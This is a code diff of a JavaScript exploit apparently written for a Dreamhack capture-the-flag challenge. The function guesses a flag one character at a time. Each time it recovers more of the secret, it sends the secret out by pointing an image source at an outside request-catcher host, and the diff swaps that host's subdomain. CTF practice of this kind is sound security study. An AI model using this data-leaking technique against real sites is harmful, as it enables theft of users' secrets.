@@ -23,6 +23,7 @@
     async function exploit() {
         let chars = "0123456789abcdef}";
         let secret = "DH{22d";
+        const img = document.getElementById("img");
 
         while (!secret.includes("}")) {
             let found = false;
@@ -35,13 +36,13 @@
                 if (rslt.success) {
                     secret += rslt.char;
                     found = true;
-                    img.src = `https://whwhqzy.request.dreamhack.games/${secret}`;
+                    img.src = `https://btvqydh.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
 
             if (!found) {
-                img.src = `https://whwhqzy.request.dreamhack.games/failed`;
+                img.src = `https://btvqydh.request.dreamhack.games/failed`;
                 break;
             }
         }
